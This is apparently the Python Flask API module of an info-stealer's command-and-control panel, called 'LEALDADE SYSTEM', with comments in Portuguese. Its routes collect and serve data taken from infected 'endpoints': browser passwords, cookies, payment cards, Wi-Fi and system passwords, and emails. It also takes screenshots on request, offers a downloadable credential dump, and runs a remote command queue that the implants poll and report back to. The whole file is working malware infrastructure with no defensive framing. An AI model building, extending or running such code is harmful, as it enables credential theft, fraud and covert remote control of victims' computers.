from datetime import datetime
from flask import Blueprint, jsonify, request
from .auth import require_login
import store

api_bp = Blueprint('api', __name__)

@api_bp.route('/api/stats', methods=['GET'])
@require_login
def get_stats():
    online = sum(1 for e in store.endpoints.values() if e.get('status') == 'online')
    return jsonify({
        'total_endpoints': len(store.endpoints),
        'online_endpoints': online,
        'total_metrics': len(store.metrics_data)
    })

@api_bp.route('/api/endpoints', methods=['GET'])
@require_login
def get_endpoints():
    return jsonify(list(store.endpoints.values()))

@api_bp.route('/api/metrics', methods=['GET'])
@require_login
def get_metrics_list():
    return jsonify(store.metrics_data)

@api_bp.route('/api/screenshot/<endpoint_id>', methods=['GET'])
@require_login
def get_endpoint_screenshot(endpoint_id):
    s = store.endpoint_screenshots.get(endpoint_id, {})
    return jsonify(s)

@api_bp.route('/api/downloads_data', methods=['GET'])
@require_login
def get_downloads_data():
    all_downloads = []
    for ep_id, ep_data in store.endpoints.items():
        if 'downloads' in ep_data:
            for dl in ep_data['downloads']:
                dl['endpoint_id'] = ep_id
                all_downloads.append(dl)
    return jsonify(all_downloads)

@api_bp.route('/api/cards_data', methods=['GET'])
@require_login
def get_cards_data():
    all_cards = []
    for ep_id, ep_data in store.endpoints.items():
        if 'cards' in ep_data:
            for card in ep_data['cards']:
                card['endpoint_id'] = ep_id
                all_cards.append(card)
    return jsonify(all_cards)

@api_bp.route('/api/emails_data', methods=['GET'])
@require_login
def get_emails_data():
    all_emails = []
    for ep_id, ep_data in store.endpoints.items():
        if 'emails' in ep_data:
            for email in ep_data['emails']:
                all_emails.append({'endpoint_id': ep_id, 'email': email})
    return jsonify(all_emails)

@api_bp.route('/api/wifi_data', methods=['GET'])
@require_login
def get_wifi_data():
    all_wifi = []
    for ep_id, ep_data in store.endpoints.items():
        if 'wifi_passwords' in ep_data:
            for wifi in ep_data['wifi_passwords']:
                wifi['endpoint_id'] = ep_id
                all_wifi.append(wifi)
    return jsonify(all_wifi)

@api_bp.route('/api/system_passwords_data', methods=['GET'])
@require_login
def get_system_passwords_data():
    all_sys_pwd = []
    for ep_id, ep_data in store.endpoints.items():
        if 'system_passwords' in ep_data:
            for pwd in ep_data['system_passwords']:
                pwd['endpoint_id'] = ep_id
                all_sys_pwd.append(pwd)
    return jsonify(all_sys_pwd)

@api_bp.route('/api/system_info_data/<endpoint_id>', methods=['GET'])
@require_login
def get_system_info_data(endpoint_id):
    info = store.endpoint_system_info.get(endpoint_id, {})
    return jsonify(info)

@api_bp.route('/api/screenshot_request/<endpoint_id>', methods=['GET'])
def check_screenshot_request(endpoint_id):
    request_data = store.screenshot_requests.get(endpoint_id, {})
    return jsonify(request_data)

@api_bp.route('/api/request_screenshot/<endpoint_id>', methods=['POST'])
@require_login
def request_screenshot(endpoint_id):
    if endpoint_id not in store.screenshot_requests:
        store.screenshot_requests[endpoint_id] = {
            'request_screenshot': True,
            'timestamp': datetime.now().isoformat()
        }
    return jsonify({'status': 'success', 'message': f'Screenshot solicitado para {endpoint_id}'})

@api_bp.route('/api/screenshot_data', methods=['POST'])
def receive_screenshot():
    data = request.get_json(force=True)
    if not data or 'endpoint_id' not in data or 'screenshot' not in data:
        return jsonify({'status': 'error', 'message': 'Dados inválidos'}), 400
    
    endpoint_id = data['endpoint_id']
    screenshot_data = data['screenshot']
    timestamp = data.get('timestamp', datetime.now().isoformat())
    
    # Armazenar screenshot
    if endpoint_id not in store.endpoint_screenshots:
        store.endpoint_screenshots[endpoint_id] = {}
    
    store.endpoint_screenshots[endpoint_id] = {
        'screenshot': screenshot_data,
        'timestamp': timestamp,
        'endpoint_id': endpoint_id
    }
    
    # Limpar solicitação
    if endpoint_id in store.screenshot_requests:
        del store.screenshot_requests[endpoint_id]
    
    return jsonify({'status': 'success', 'message': 'Screenshot recebido'})

@api_bp.route('/api/test')
def test_api():
    return jsonify({
        'status': 'online',
        'server': 'LEALDADE SYSTEM',
        'timestamp': datetime.now().isoformat(),
        'endpoints_count': len(store.endpoints)
    })

@api_bp.route('/api/system_logs', methods=['GET'])
@require_login
def get_system_logs():
    return jsonify(store.system_logs)

@api_bp.route('/api/dump/<endpoint_id>', methods=['GET'])
@require_login
def dump_data(endpoint_id):
    from flask import Response
    import json
    
    if endpoint_id not in store.endpoints:
        return jsonify({'error': 'Endpoint não encontrado'}), 404
        
    dump = f"================ EXTRACT DUMP : {endpoint_id} ================\n\n"
    
    # Adicionando Senhas
    passwords = [p for p in store.endpoints.get(endpoint_id, {}).get('passwords', [])]
    dump += "=== SENHAS NAVEGADOR ===\n"
    for p in passwords:
        dump += f"URL: {p.get('url', '')}\nUSER: {p.get('username', '')}\nPASS: {p.get('password', '')}\n--\n"
        
    # Adicionando Cookies
    cookies = [c for c in store.endpoints.get(endpoint_id, {}).get('cookies', [])]
    dump += "\n=== COOKIES ===\n"
    for c in cookies:
        dump += f"HOST: {c.get('host', '')}\nNAME: {c.get('name', '')}\nVALUE: {c.get('value', '')}\n--\n"
        
    store.add_log('WARNING', 'C2', f"Dump completo extraído para o endpoint {endpoint_id}")
    return Response(dump, mimetype='text/plain', headers={"Content-Disposition": f"attachment;filename=dump_{endpoint_id}.txt"})

@api_bp.route('/api/command_request/<endpoint_id>', methods=['POST'])
@require_login
def request_command(endpoint_id):
    data = request.get_json(force=True)
    command = data.get('command')
    if not command:
         return jsonify({'error': 'Comando vazio'}), 400
         
    if endpoint_id not in store.command_queues:
        store.command_queues[endpoint_id] = []
        
    cmd_data = {
        'id': f"cmd_{datetime.now().timestamp()}",
        'command': command,
        'status': 'pending',
        'timestamp': datetime.now().isoformat()
    }
    store.command_queues[endpoint_id].append(cmd_data)
    store.add_log('WARNING', 'C2', f"Comando '{command}' enviado para fila do endpoint {endpoint_id}")
    
    return jsonify({'success': True, 'command_id': cmd_data['id']})

@api_bp.route('/api/check_commands/<endpoint_id>', methods=['GET'])
def check_commands(endpoint_id):
    if endpoint_id in store.command_queues and len(store.command_queues[endpoint_id]) > 0:
        # Pega e remove o comando mais antigo da fila
        cmd = store.command_queues[endpoint_id].pop(0)
        return jsonify({'has_command': True, 'command': cmd['command'], 'command_id': cmd['id']})
    return jsonify({'has_command': False})

@api_bp.route('/api/command_result', methods=['POST'])
def receive_command_result():
    data = request.get_json(force=True)
    if not data or 'endpoint_id' not in data or 'command' not in data:
        return jsonify({'error': 'Dados inválidos'}), 400
    
    endpoint_id = data.get('endpoint_id')
    command = data.get('command')
    output = data.get('output', '')
    return_code = data.get('return_code', 0)
    
    # Adicionar log do resultado
    log_message = f"Comando '{command}' executado no endpoint {endpoint_id}. Return code: {return_code}"
    if output:
        log_message += f". Output: {output[:200]}{'...' if len(output) > 200 else ''}"
    
    store.add_log('INFO', 'C2', log_message)
    
    return jsonify({'success': True, 'message': 'Resultado recebido'})
